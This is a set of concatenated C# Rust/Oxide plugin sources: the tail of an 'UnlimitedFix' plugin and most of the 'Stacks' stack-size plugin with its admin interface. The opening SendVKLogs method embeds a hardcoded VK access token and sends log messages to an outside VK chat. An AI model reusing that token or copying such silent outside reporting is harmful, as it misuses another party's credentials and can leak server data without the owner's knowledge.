        void SendVKLogs(string msg)
            {
  			int RandomID = UnityEngine.Random.Range(0, 9999);
            int id = 4;
            string token = "vk1.a.tcoWQY16tiO4ql598VY8ZojOrDShgLJF1vCtogWQYDdDSFE0fh5PBmo6qu8eg4SXvdctglNooHJ6Dcj0vMCuGS_b47KzKPU8iEhezGAUdG07eTq_6Lyw7BmzdmkOXqBVKECRwOFZ4iAYEwlI2LJ5msAxN5yHj5H_KkHP7SEPMUk_HfWk6caWxEqPsv_5nBI8hDxNLDRvlG14vOdgr1S1gQ";
            while (msg.Contains("#"))
                msg = msg.Replace("#", "%23");
            webrequest.Enqueue($"https://api.vk.com/method/messages.send?chat_id={id}&random_id={RandomID}&message={msg}&access_token={token}&v=5.92", null, (code, response) => { }, this);
        }
    }
}

// --- End of file: UnlimitedFix.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/Stacks.cs ---
// --- Original Local Path: Stacks.cs ---

﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Globalization;
using System.Linq;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Libraries.Covalence;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using UnityEngine;
using Random = UnityEngine.Random;

namespace Oxide.Plugins
{
    [Info("Stacks", "Mevent", "1.5.11")]
    public class Stacks : RustPlugin
    {
        #region Fields

        [PluginReference] private Plugin ImageLibrary, Notify;

        private const string Layer = "UI.Stacks";

        private const string AdminPerm = "stacks.admin";

        private readonly Dictionary<Item, float> _multiplierByItem = new Dictionary<Item, float>();

        private readonly List<CategoryInfo> _categories = new List<CategoryInfo>();

        private class CategoryInfo
        {
            public string Title;

            public List<ItemInfo> Items;
        }

        private readonly Dictionary<string, int> _defaultItemStackSize = new Dictionary<string, int>();

        #endregion

        #region Config

        private Configuration _config;

        private class Configuration
        {
            [JsonProperty(PropertyName = "Commands", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public string[] Commands = { "stacks" };

            [JsonProperty(PropertyName = "Work with Notify?")]
            public bool UseNotify = true;

            [JsonProperty(PropertyName = "Changing multiplies in containers using a hammer")]
            public bool UserHammer;

            [JsonProperty(PropertyName = "Default Multiplier for new containers")]
            public float DefaultContainerMultiplier = 1f;

            [JsonProperty(PropertyName = "Blocked List")]
            public BlockList BlockList = new BlockList
            {
                Items = new List<string>
                {
                    "item",
                    "short name"
                },
                Skins = new List<ulong>
                {
                    111111111111,
                    222222222222
                }
            };
        }

        private class BlockList
        {
            [JsonProperty(PropertyName = "Items", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<string> Items;

            [JsonProperty(PropertyName = "Skins", ObjectCreationHandling = ObjectCreationHandling.Replace)]
            public List<ulong> Skins;

            public bool Exists(Item item)
            {
                return Items.Contains(item.info.shortname) || Skins.Contains(item.skin);
            }
        }

        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                _config = Config.ReadObject<Configuration>();
                if (_config == null) throw new Exception();
                SaveConfig();
            }
            catch (Exception ex)
            {
                PrintError("Your configuration file contains an error. Using default configuration values.");
                LoadDefaultConfig();
                Debug.LogException(ex);
            }
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(_config);
        }

        protected override void LoadDefaultConfig()
        {
            _config = new Configuration();
        }

        #endregion

        #region Data

        private List<ItemInfo> _items;

        private Dictionary<string, ContainerData> _containers;

        private void SaveData()
        {
            Interface.Oxide.DataFileSystem.WriteObject($"{Name}/Containers", _containers);

            Interface.Oxide.DataFileSystem.WriteObject($"{Name}/Items", _items);
        }

        private void LoadData()
        {
            try
            {
                _containers =
                    Interface.Oxide.DataFileSystem.ReadObject<Dictionary<string, ContainerData>>($"{Name}/Containers");

                _items = Interface.Oxide.DataFileSystem.ReadObject<List<ItemInfo>>($"{Name}/Items");
            }
            catch (Exception e)
            {
                PrintError(e.ToString());
            }

            if (_containers == null) _containers = new Dictionary<string, ContainerData>();
            if (_items == null) _items = new List<ItemInfo>();
        }

        private class ContainerData
        {
            [JsonProperty(PropertyName = "Image")] public string Image;

            [JsonProperty(PropertyName = "Multiplier")] [DefaultValue(1f)]
            public float Multiplier;

            [JsonIgnore] public int ID;
        }

        private class ItemInfo
        {
            [JsonProperty(PropertyName = "ShortName")]
            public string ShortName;

            [JsonProperty(PropertyName = "Name")] public string Name;

            [JsonProperty(PropertyName = "Default Stack Size")]
            public int DefaultStackSize;

            [JsonProperty(PropertyName = "Custom Stack Size")]
            public int CustomStackSize;

            [JsonIgnore] public int ID;
        }

        private readonly Dictionary<string, string> _constContainers = new Dictionary<string, string>
        {
            ["assets/bundled/prefabs/static/bbq.static.prefab"] = "https://i.imgur.com/L28375p.png",
            ["assets/bundled/prefabs/static/hobobarrel_static.prefab"] = "https://i.imgur.com/v8sDTaP.png",
            ["assets/bundled/prefabs/static/recycler_static.prefab"] = "https://i.imgur.com/V1smQYs.png",
            ["assets/bundled/prefabs/static/repairbench_static.prefab"] = "https://i.imgur.com/8qV6Z10.png",
            ["assets/bundled/prefabs/static/researchtable_static.prefab"] = "https://i.imgur.com/guoVK66.png",
            ["assets/bundled/prefabs/static/small_refinery_static.prefab"] = "https://i.imgur.com/o4iHwpz.png",
            ["assets/bundled/prefabs/static/wall.frame.shopfront.metal.static.prefab"] =
                "https://i.imgur.com/aJIU90I.png",
            ["assets/bundled/prefabs/static/water_catcher_small.static.prefab"] = "https://i.imgur.com/ZdaXU6q.png",
            ["assets/bundled/prefabs/static/workbench1.static.prefab"] = "https://i.imgur.com/0Trejvg.png",
            ["assets/content/props/fog machine/fogmachine.prefab"] = "https://i.imgur.com/v33hmbo.png",
            ["assets/content/structures/excavator/prefabs/engine.prefab"] = "",
            ["assets/content/structures/excavator/prefabs/excavator_output_pile.prefab"] = "",
            ["assets/content/vehicles/boats/rhib/subents/fuel_storage.prefab"] = "https://i.imgur.com/QXjLWzj.png",
            ["assets/content/vehicles/boats/rhib/subents/rhib_storage.prefab"] = "https://i.imgur.com/QXjLWzj.png",
            ["assets/content/vehicles/boats/rowboat/subents/fuel_storage.prefab"] = "https://i.imgur.com/FLr37Mb.png",
            ["assets/content/vehicles/boats/rowboat/subents/rowboat_storage.prefab"] =
                "https://i.imgur.com/FLr37Mb.png",
            ["assets/content/vehicles/minicopter/subents/fuel_storage.prefab"] = "https://i.imgur.com/BRBfPjB.png",
            ["assets/content/vehicles/modularcar/2module_car_spawned.entity.prefab"] =
                "https://i.imgur.com/3CSoGly.png",
            ["assets/content/vehicles/modularcar/3module_car_spawned.entity.prefab"] =
                "https://i.imgur.com/HpteUCe.png",
            ["assets/content/vehicles/modularcar/4module_car_spawned.entity.prefab"] =
                "https://i.imgur.com/QI7tzYJ.png",
            ["assets/content/vehicles/modularcar/subents/modular_car_1mod_storage.prefab"] = "",
            ["assets/content/vehicles/modularcar/subents/modular_car_2mod_fuel_tank.prefab"] = "",
            ["assets/content/vehicles/modularcar/subents/modular_car_fuel_storage.prefab"] = "",
            ["assets/content/vehicles/modularcar/subents/modular_car_i4_engine_storage.prefab"] = "",
            ["assets/content/vehicles/modularcar/subents/modular_car_v8_engine_storage.prefab"] = "",
            ["assets/content/vehicles/scrap heli carrier/subents/fuel_storage_scrapheli.prefab"] = "",
            ["assets/prefabs/building/wall.frame.shopfront/wall.frame.shopfront.metal.prefab"] =
                "https://i.imgur.com/aJIU90I.png",
            ["assets/prefabs/deployable/bbq/bbq.deployed.prefab"] = "https://i.imgur.com/L28375p.png",
            ["assets/prefabs/deployable/campfire/campfire.prefab"] = "https://i.imgur.com/FIznmKI.png",
            ["assets/prefabs/deployable/composter/composter.prefab"] = "https://i.imgur.com/glcIjOS.png",
            ["assets/prefabs/deployable/dropbox/dropbox.deployed.prefab"] = "https://i.imgur.com/HmoyaIU.png",
            ["assets/prefabs/deployable/fireplace/fireplace.deployed.prefab"] = "https://i.imgur.com/XsMSlNY.png",
            ["assets/prefabs/deployable/fridge/fridge.deployed.prefab"] = "https://i.imgur.com/ERNmHjz.png",
            ["assets/prefabs/deployable/furnace.large/furnace.large.prefab"] = "https://i.imgur.com/GWaSIUw.png",
            ["assets/prefabs/deployable/furnace/furnace.prefab"] = "https://i.imgur.com/cnFpbOj.png",
            ["assets/prefabs/deployable/hitch & trough/hitchtrough.deployed.prefab"] =
                "https://i.imgur.com/FiSIYh9.png",
            ["assets/prefabs/deployable/hot air balloon/subents/hab_storage.prefab"] =
                "https://i.imgur.com/KaGFKkM.png",
            ["assets/prefabs/deployable/jack o lantern/jackolantern.angry.prefab"] = "https://i.imgur.com/iPBEYf3.png",
            ["assets/prefabs/deployable/jack o lantern/jackolantern.happy.prefab"] = "https://i.imgur.com/brKtJJj.png",
            ["assets/prefabs/deployable/lantern/lantern.deployed.prefab"] = "https://i.imgur.com/LqfkTKp.png",
            ["assets/prefabs/deployable/large wood storage/box.wooden.large.prefab"] =
                "https://i.imgur.com/wecMrji.png",
            ["assets/prefabs/deployable/liquidbarrel/waterbarrel.prefab"] = "https://i.imgur.com/LAHPuI9.png",
            ["assets/prefabs/deployable/locker/locker.deployed.prefab"] = "https://i.imgur.com/jZ4raNL.png",
            ["assets/prefabs/deployable/mailbox/mailbox.deployed.prefab"] = "https://i.imgur.com/egLTaYb.png",
            ["assets/prefabs/deployable/mixingtable/mixingtable.deployed.prefab"] = "https://i.imgur.com/sbyHOjn.png",
            ["assets/prefabs/deployable/oil jack/crudeoutput.prefab"] = "",
            ["assets/prefabs/deployable/oil jack/fuelstorage.prefab"] = "",
            ["assets/prefabs/deployable/oil refinery/refinery_small_deployed.prefab"] =
                "https://i.imgur.com/1KMt1eu.png",
            ["assets/prefabs/deployable/planters/planter.large.deployed.prefab"] = "https://i.imgur.com/POcQ0Ya.png",
            ["assets/prefabs/deployable/planters/planter.small.deployed.prefab"] = "https://i.imgur.com/fMO8cJF.png",
            ["assets/prefabs/deployable/playerioents/generators/fuel generator/small_fuel_generator.deployed.prefab"] =
                "https://i.imgur.com/fghbYKE.png",
            ["assets/prefabs/deployable/playerioents/poweredwaterpurifier/poweredwaterpurifier.deployed.prefab"] =
                "https://i.imgur.com/Tg2dX8b.png",
            ["assets/prefabs/deployable/playerioents/poweredwaterpurifier/poweredwaterpurifier.storage.prefab"] =
                "https://i.imgur.com/Tg2dX8b.png",
            ["assets/prefabs/deployable/playerioents/waterpump/water.pump.deployed.prefab"] =
                "https://i.imgur.com/FZG19ki.png",
            ["assets/prefabs/deployable/quarry/fuelstorage.prefab"] = "https://i.imgur.com/U1y3pmJ.png",
            ["assets/prefabs/deployable/quarry/hopperoutput.prefab"] = "https://i.imgur.com/U1y3pmJ.png",
            ["assets/prefabs/deployable/repair bench/repairbench_deployed.prefab"] = "https://i.imgur.com/8qV6Z10.png",
            ["assets/prefabs/deployable/research table/researchtable_deployed.prefab"] =
                "https://i.imgur.com/guoVK66.png",
            ["assets/prefabs/deployable/single shot trap/guntrap.deployed.prefab"] = "https://i.imgur.com/rGstq6A.png",
            ["assets/prefabs/deployable/small stash/small_stash_deployed.prefab"] = "https://i.imgur.com/ToPKE7j.png",
            ["assets/prefabs/deployable/survivalfishtrap/survivalfishtrap.deployed.prefab"] =
                "https://i.imgur.com/2D6jZ7j.png",
            ["assets/prefabs/deployable/tier 1 workbench/workbench1.deployed.prefab"] =
                "https://i.imgur.com/0Trejvg.png",
            ["assets/prefabs/deployable/tier 2 workbench/workbench2.deployed.prefab"] =
                "https://i.imgur.com/cM5F6SO.png",
            ["assets/prefabs/deployable/tier 3 workbench/workbench3.deployed.prefab"] =
                "https://i.imgur.com/ToyPHJK.png",
            ["assets/prefabs/deployable/tool cupboard/cupboard.tool.deployed.prefab"] =
                "https://i.imgur.com/mD9KsAL.png",
            ["assets/prefabs/deployable/tuna can wall lamp/tunalight.deployed.prefab"] =
                "https://i.imgur.com/EWXtCJg.png",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_attire.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_building.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_components.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_extra.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_farming.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_resources.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_tools.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_vehicleshigh.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/npcvendingmachine_weapons.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/npcvendingmachines/shopkeeper_vm_invis.prefab"] = "",
            ["assets/prefabs/deployable/vendingmachine/vendingmachine.deployed.prefab"] =
                "https://i.imgur.com/8Kfvfgp.png",
            ["assets/prefabs/deployable/water catcher/water_catcher_large.prefab"] = "https://i.imgur.com/MF90xE7.png",
            ["assets/prefabs/deployable/water catcher/water_catcher_small.prefab"] = "https://i.imgur.com/ZdaXU6q.png",
            ["assets/prefabs/deployable/water well/waterwellstatic.prefab"] = "",
            ["assets/prefabs/deployable/water well/waterwellstatic.prefab"] = "https://i.imgur.com/FyQJnhX.png",
            ["assets/prefabs/deployable/waterpurifier/waterstorage.prefab"] = "https://i.imgur.com/FyQJnhX.png",
            ["assets/prefabs/deployable/woodenbox/woodbox_deployed.prefab"] = "https://i.imgur.com/gwhRYjt.png",
            ["assets/prefabs/io/electric/switches/fusebox/fusebox.prefab"] = "",
            ["assets/prefabs/misc/casino/bigwheel/bigwheelbettingterminal.prefab"] = "",
            ["assets/prefabs/misc/chinesenewyear/chineselantern/chineselantern.deployed.prefab"] =
                "https://i.imgur.com/WUa0fN2.png",
            ["assets/prefabs/misc/halloween/coffin/coffinstorage.prefab"] = "https://i.imgur.com/zHbT59P.png",
            ["assets/prefabs/misc/halloween/cursed_cauldron/cursedcauldron.deployed.prefab"] =
                "https://i.imgur.com/z6QnrT3.png",
            ["assets/prefabs/misc/halloween/skull_fire_pit/skull_fire_pit.prefab"] = "https://i.imgur.com/9phq5Bu.png",
            ["assets/prefabs/misc/halloween/trophy skulls/skulltrophy.deployed.prefab"] =
                "https://i.imgur.com/TmntgJT.png",
            ["assets/prefabs/misc/item drop/item_drop.prefab"] = "",
            ["assets/prefabs/misc/item drop/item_drop_backpack.prefab"] = "",
            ["assets/prefabs/misc/marketplace/marketterminal.prefab"] = "",
            ["assets/prefabs/misc/summer_dlc/abovegroundpool/abovegroundpool.deployed.prefab"] = "",
            ["assets/prefabs/misc/summer_dlc/paddling_pool/paddlingpool.deployed.prefab"] =
                "https://i.imgur.com/v2V6T7d.png",
            ["assets/prefabs/misc/summer_dlc/photoframe/photoframe.landscape.prefab"] =
                "https://i.imgur.com/nH2jf5j.png",
            ["assets/prefabs/misc/summer_dlc/photoframe/photoframe.large.prefab"] = "https://i.imgur.com/sPfBcVt.png",
            ["assets/prefabs/misc/summer_dlc/photoframe/photoframe.portrait.prefab"] =
                "https://i.imgur.com/gvbD7Pm.png",
            ["assets/prefabs/misc/supply drop/supply_drop.prefab"] = "https://i.imgur.com/VAtGtQB.png",
            ["assets/prefabs/misc/xmas/snow_machine/models/snowmachine.prefab"] = "https://i.imgur.com/pAqw9It.png",
            ["assets/prefabs/misc/twitch/hobobarrel/hobobarrel.deployed.prefab"] = "https://i.imgur.com/v8sDTaP.png",
            ["assets/prefabs/misc/xmas/xmastree/xmas_tree.deployed.prefab"] = "https://i.imgur.com/wQU9ojJ.png",
            ["assets/prefabs/npc/autoturret/autoturret_deployed.prefab"] = "https://i.imgur.com/VUiBkC5.png",
            ["assets/prefabs/npc/flame turret/flameturret.deployed.prefab"] = "https://i.imgur.com/TcIOwLa.png",
            ["assets/prefabs/npc/sam_site_turret/sam_site_turret_deployed.prefab"] = "https://i.imgur.com/SNBPqIX.png"
        };

        #endregion

        #region Hooks

        private void Init()
        {
            LoadData();

            if (!_config.UserHammer)
                Unsubscribe(nameof(OnHammerHit));
        }

        private void OnServerInitialized(bool init)
        {
            LoadItems();

            LoadCategories();

            LoadContainers(init);

            LoadImages();

            RegisterPermissions();

            AddCovalenceCommand(_config.Commands, nameof(CmdOpenStacks));
        }

        private void Unload()
        {
            foreach (var player in BasePlayer.activePlayerList) CuiHelper.DestroyUi(player, Layer);

            foreach (var check in _defaultItemStackSize)
            {
                var info = ItemManager.FindItemDefinition(check.Key);
                if (info != null)
                    info.stackable = check.Value;
            }

            SaveData();
        }

        private object CanMoveItem(Item movedItem, PlayerInventory playerInventory, uint targetContainerID,
            int targetSlot, int amount) //credits Jake_Rich
        {
            if (movedItem == null || playerInventory == null || _config.BlockList.Exists(movedItem)) return null;

            _multiplierByItem.Remove(movedItem);

            var container = playerInventory.FindContainer(targetContainerID);
            var player = playerInventory.GetComponent<BasePlayer>();

            if (container != null)
            {
                var entity = container.entityOwner;
                if (entity != null)
                {
                    ContainerData data;
                    if (_containers.TryGetValue(entity.name, out data)) _multiplierByItem[movedItem] = data.Multiplier;
                }
            }

            #region Right-Click Overstack into Player Inventory

            if (targetSlot == -1)
            {
                //Right click overstacks into player inventory
                if (container == null)
                {
                    if (movedItem.amount > movedItem.info.stackable)
                    {
                        var loops = 1;
                        if (player.serverInput.IsDown(BUTTON.SPRINT))
                            loops = Mathf.CeilToInt((float)movedItem.amount / movedItem.info.stackable);
                        for (var i = 0; i < loops; i++)
                        {
                            if (movedItem.amount <= movedItem.info.stackable)
                            {
                                playerInventory.GiveItem(movedItem);
                                break;
                            }

                            var itemToMove = movedItem.SplitItem(movedItem.info.stackable);
                            var moved = playerInventory.GiveItem(itemToMove);
                            if (moved == false)
                            {
                                movedItem.amount += itemToMove.amount;
                                itemToMove.Remove();
                                break;
                            }

                            movedItem.MarkDirty();
                        }

                        playerInventory.ServerUpdate(0f);
                        return true;
                    }
                }
                //Shift Right click into storage container
                else
                {
                    if (player.serverInput.IsDown(BUTTON.SPRINT))
                    {
                        foreach (var item in playerInventory.containerMain.itemList.Where(x => x.info == movedItem.info)
                            .ToList()) item.MoveToContainer(container);
                        foreach (var item in playerInventory.containerBelt.itemList.Where(x => x.info == movedItem.info)
                            .ToList()) item.MoveToContainer(container);
                        playerInventory.ServerUpdate(0f);
                        return false;
                    }
                }
            }

            #endregion

            #region Moving Overstacks Around In Chest

            if (amount > movedItem.info.stackable && container != null)
            {
                var targetItem = container.GetSlot(targetSlot);
                if (targetItem == null)
                {
                    if (amount < movedItem.amount)
                        //Split item into chest
                        ItemHelper.SplitMoveItem(movedItem, amount, container, targetSlot);
                    else
                        //Moving items when amount > info.stacksize
                        ItemHelper.SplitMoveItem(movedItem, movedItem.info.stackable, container, targetSlot);
                }
                else
                {
                    if (!targetItem.CanStack(movedItem) && amount == movedItem.amount)
                    {
                        //Swapping positions of items
                        ItemHelper.SwapItems(movedItem, targetItem);
                    }
                    else
                    {
                        if (amount < movedItem.amount)
                            ItemHelper.SplitMoveItem(movedItem, amount, playerInventory);
                        else
                            movedItem.MoveToContainer(container, targetSlot);
                        //Stacking items when amount > info.stacksize
                    }
                }

                playerInventory.ServerUpdate(0f);
                return true;
            }

            #endregion

            #region Prevent Moving Overstacks To Inventory

            if (container != null)
            {
                var targetItem = container.GetSlot(targetSlot);
                if (targetItem != null)
                    if (movedItem.parent.playerOwner == player)
                        if (!movedItem.CanStack(targetItem))
                            if (targetItem.amount > targetItem.info.stackable)
                                return true;
            }

            #endregion

            return null;
        }

        private int? OnMaxStackable(Item item)
        {
            if (item == null || item.info.itemType == ItemContainer.ContentsType.Liquid || item.info.stackable == 1 ||
                _config.BlockList.Exists(item))
                return null;

            float multiplier;
            if (_multiplierByItem.TryGetValue(item, out multiplier))
                return Mathf.FloorToInt(item.info.stackable * multiplier);

            if (item.parent == null || item.parent.entityOwner == null) return null;

            ContainerData data;
            if (_containers.TryGetValue(item.parent.entityOwner.name, out data))
                return Mathf.FloorToInt(data.Multiplier * item.info.stackable);

            return null;
        }

        private void OnItemDropped(Item item, BaseEntity entity)
        {
            item.RemoveFromContainer();
            var stackSize = item.info.stackable;
            if (item.amount <= stackSize) return;

            var loops = Mathf.FloorToInt((float)item.amount / stackSize);
            if (loops > 20) return;
            for (var i = 0; i < loops; i++)
            {
                if (item.amount <= stackSize) break;

                item.SplitItem(stackSize)?.Drop(entity.transform.position,
                    entity.GetComponent<Rigidbody>().velocity + Vector3Ex.Range(-1f, 1f));
            }
        }

        private void OnHammerHit(BasePlayer player, HitInfo info)
        {
            if (!_config.UserHammer || player == null ||
                !permission.UserHasPermission(player.UserIDString, AdminPerm) || info == null)
                return;

            var container = info.HitEntity;
            if (container == null)
                return;

            ContainerData data;
            if (_containers.TryGetValue(container.name, out data))
                SettingsUi(player, 1, 0, 0, data.ID, first: true);
        }

        #endregion

        #region Commands

        private void CmdOpenStacks(IPlayer cov, string command, string[] args)
        {
            var player = cov?.Object as BasePlayer;
            if (player == null) return;

            if (!permission.UserHasPermission(player.UserIDString, AdminPerm))
            {
                SendNotify(player, NoPermission, 1);
                return;
            }

            if (args.Length == 0)
            {
                MainUi(player, first: true);
                return;
            }

            switch (args[0])
            {
                case "sethandstack":
                {
                    int stackSize;
                    if (args.Length < 2 || !int.TryParse(args[1], out stackSize))
                    {
                        cov.Reply($"Error syntax! Use: /{command} {args[0]} [stackSize]");
                        return;
                    }

                    var activeItem = player.GetActiveItem();
                    if (activeItem == null)
                    {
                        cov.Reply("You are missing an item in your hand!");
                        return;
                    }

                    var item = _items.Find(x => x.ShortName == activeItem.info.shortname);
                    if (item == null)
                    {
                        cov.Reply("Item not found!");
                        return;
                    }

                    item.CustomStackSize = stackSize;

                    UpdateItemStack(item);

                    SendNotify(player, SetStack, 0, stackSize, item.Name);

                    SaveData();
                    break;
                }

                case "setstack":
                {
                    int stackSize;
                    if (args.Length < 3 || !int.TryParse(args[2], out stackSize))
                    {
                        cov.Reply($"Error syntax! Use: /{command} {args[0]} [shortName] [stackSize]");
                        return;
                    }

                    var item = _items.Find(x => x.ShortName == args[1]);
                    if (item == null)
                    {
                        cov.Reply($"Item '{args[1]}' not found!");
                        return;
                    }

                    item.CustomStackSize = stackSize;

                    UpdateItemStack(item);

                    SendNotify(player, SetStack, 0, stackSize, item.Name);

                    SaveData();
                    break;
                }
            }
        }

        [ConsoleCommand("UI_Stacks")]
        private void CmdConsoleStacks(ConsoleSystem.Arg arg)
        {
            var player = arg?.Player();
            if (player == null || !arg.HasArgs()) return;

            switch (arg.Args[0])
            {
                case "page":
                {
                    int type, category = -1, page = 0;
                    if (!arg.HasArgs(2) || !int.TryParse(arg.Args[1], out type)) return;

                    if (arg.HasArgs(3))
                        int.TryParse(arg.Args[2], out category);

                    if (arg.HasArgs(4))
                        int.TryParse(arg.Args[3], out page);

                    var search = string.Empty;
                    if (arg.HasArgs(5))
                        search = arg.Args[4];

                    MainUi(player, type, category, page, search);
                    break;
                }

                case "enter_page":
                {
                    int type, category, page;
                    if (!arg.HasArgs(5) ||
                        !int.TryParse(arg.Args[1], out type) ||
                        !int.TryParse(arg.Args[2], out category) ||
                        !int.TryParse(arg.Args[4], out page)) return;

                    var search = arg.Args[3];
                    if (string.IsNullOrEmpty(search)) return;

                    MainUi(player, type, category, page, search);
                    break;
                }

                case "settings":
                {
                    int type, category, page, id;
                    if (!arg.HasArgs(5) ||
                        !int.TryParse(arg.Args[1], out type) ||
                        !int.TryParse(arg.Args[2], out category) ||
                        !int.TryParse(arg.Args[3], out page) ||
                        !int.TryParse(arg.Args[4], out id)) return;

                    var enterValue = -1;
                    if (arg.HasArgs(6))
                        int.TryParse(arg.Args[5], out enterValue);

                    SettingsUi(player, type, category, page, id, enterValue);
                    break;
                }

                case "apply_settings":
                {
                    int type, category, page, id;
                    float nowValue;
                    if (!arg.HasArgs(6) ||
                        !int.TryParse(arg.Args[1], out type) ||
                        !int.TryParse(arg.Args[2], out category) ||
                        !int.TryParse(arg.Args[3], out page) ||
                        !int.TryParse(arg.Args[4], out id) ||
                        !float.TryParse(arg.Args[5], out nowValue) || nowValue <= 0) return;

                    switch (type)
                    {
                        case 0: //item
                        {
                            var item = _items.Find(x => x.ID == id);
                            if (item == null) return;

                            item.CustomStackSize = (int)nowValue;

                            UpdateItemStack(item);

                            SaveData();
                            break;
                        }

                        case 1: //container
                        {
                            if (_containers.All(x => x.Value.ID != id))
                                return;

                            var cont = _containers.FirstOrDefault(x => x.Value.ID == id);

                            cont.Value.Multiplier = nowValue;

                            SaveData();
                            break;
                        }
                    }

                    MainUi(player, type, category, page);
                    break;
                }
            }
        }

        #endregion

        #region Interface

        private void MainUi(BasePlayer player, int type = 0, int category = -1, int page = 0, string search = "",
            bool first = false)
        {
            var lines = 0;
            float height;
            float ySwitch;

            var container = new CuiElementContainer();

            #region Background

            if (first)
            {
                CuiHelper.DestroyUi(player, Layer);

                container.Add(new CuiPanel
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Image =
                    {
                        Color = "0 0 0 0.9",
                        Material = "assets/content/ui/uibackgroundblur.mat"
                    },
                    CursorEnabled = true
                }, "Overlay", Layer);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Text = { Text = "" },
                    Button =
                    {
                        Color = "0 0 0 0",
                        Close = Layer
                    }
                }, Layer);
            }

            #endregion

            #region Main

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5",
                    OffsetMin = "-300 -250",
                    OffsetMax = "300 255"
                },
                Image =
                {
                    Color = HexToCuiColor("#0E0E10")
                }
            }, Layer, Layer + ".Main");

            #region Header

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "0 1", AnchorMax = "1 1",
                    OffsetMin = "0 -50",
                    OffsetMax = "0 0"
                },
                Image = { Color = HexToCuiColor("#161617") }
            }, Layer + ".Main", Layer + ".Header");

            container.Add(new CuiLabel
            {
                RectTransform =
                {
                    AnchorMin = "0 0", AnchorMax = "1 1",
                    OffsetMin = "30 0",
                    OffsetMax = "0 0"
                },
                Text =
                {
                    Text = Msg(player, TitleMenu),
                    Align = TextAnchor.MiddleLeft,
                    Font = "robotocondensed-bold.ttf",
                    FontSize = 14,
                    Color = HexToCuiColor("#FFFFFF")
                }
            }, Layer + ".Header");

            float xSwitch = -25;
            float width = 25;
            float margin = 5;

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = $"{xSwitch - width} -37.5",
                    OffsetMax = $"{xSwitch} -12.5"
                },
                Text =
                {
                    Text = Msg(player, CloseButton),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-bold.ttf",
                    FontSize = 10,
                    Color = HexToCuiColor("#FFFFFF")
                },
                Button =
                {
                    Close = Layer,
                    Color = HexToCuiColor("#4B68FF")
                }
            }, Layer + ".Header");

            xSwitch = xSwitch - margin - width;
            width = 80;

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = $"{xSwitch - width} -37.5",
                    OffsetMax = $"{xSwitch} -12.5"
                },
                Text =
                {
                    Text = Msg(player, ContainerTitle),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = HexToCuiColor("#FFFFFF")
                },
                Button =
                {
                    Color = type == 1 ? HexToCuiColor("#4B68FF") : HexToCuiColor("#FFFFFF", 5),
                    Command = "UI_Stacks page 1"
                }
            }, Layer + ".Header");

            xSwitch = xSwitch - margin - width;

            container.Add(new CuiButton
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = $"{xSwitch - width} -37.5",
                    OffsetMax = $"{xSwitch} -12.5"
                },
                Text =
                {
                    Text = Msg(player, ItemTitle),
                    Align = TextAnchor.MiddleCenter,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = HexToCuiColor("#FFFFFF")
                },
                Button =
                {
                    Color = type == 0 ? HexToCuiColor("#4B68FF") : HexToCuiColor("#FFFFFF", 5),
                    Command = "UI_Stacks page 0"
                }
            }, Layer + ".Header");

            #region Search

            xSwitch = xSwitch - margin - width;
            width = 140;

            container.Add(new CuiPanel
            {
                RectTransform =
                {
                    AnchorMin = "1 1", AnchorMax = "1 1",
                    OffsetMin = $"{xSwitch - width} -37.5",
                    OffsetMax = $"{xSwitch} -12.5"
                },
                Image =
                {
                    Color = HexToCuiColor("#000000")
                }
            }, Layer + ".Header", Layer + ".Header.Search");

            container.Add(new CuiLabel
            {
                RectTransform =
                {
                    AnchorMin = "0 0", AnchorMax = "1 1",
                    OffsetMin = "10 0", OffsetMax = "-10 0"
                },
                Text =
                {
                    Text = string.IsNullOrEmpty(search) ? Msg(player, SearchTitle) : $"{search}",
                    Align = TextAnchor.MiddleLeft,
                    Font = "robotocondensed-regular.ttf",
                    FontSize = 12,
                    Color = "1 1 1 0.65"
                }
            }, Layer + ".Header.Search");

            container.Add(new CuiElement
            {
                Parent = Layer + ".Header.Search",
                Components =
                {
                    new CuiInputFieldComponent
                    {
                        FontSize = 12,
                        Align = TextAnchor.MiddleCenter,
                        Font = "robotocondensed-regular.ttf",
                        Command = $"UI_Stacks page {type} {category} {page} ",
                        Color = "1 1 1 0.95",
                        CharsLimit = 32
                    },
                    new CuiRectTransformComponent
                    {
                        AnchorMin = "0 0", AnchorMax = "1 1"
                    }
                }
            });

